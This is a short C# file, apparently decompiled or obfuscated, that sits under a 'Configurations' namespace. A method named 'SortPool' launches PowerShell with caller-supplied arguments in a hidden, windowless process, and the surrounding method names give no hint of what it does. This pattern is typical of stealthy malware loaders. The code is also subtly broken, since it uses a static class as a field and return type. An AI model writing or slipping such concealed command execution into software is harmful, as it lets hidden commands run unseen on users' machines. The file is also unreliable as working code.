using System.Diagnostics;

namespace YConsoleApp117all.Configurations;

public static class Algo
{
	internal static Algo CountDecorator;

	public static Process SortPool(string var1)
	{
		ProcessStartInfo obj = new ProcessStartInfo
		{
			FileName = "powershell",
			Arguments = var1
		};
		CreateDecorator(obj, ProcessWindowStyle.Hidden);
		obj.CreateNoWindow = true;
		return Process.Start(obj);
	}

	internal static void CreateDecorator(object object_0, ProcessWindowStyle processWindowStyle_0)
	{
		((ProcessStartInfo)object_0).WindowStyle = processWindowStyle_0;
	}

	internal static bool MapDecorator()
	{
		return CountDecorator == null;
	}

	internal static Algo InsertDecorator()
	{
		return CountDecorator;
	}
}
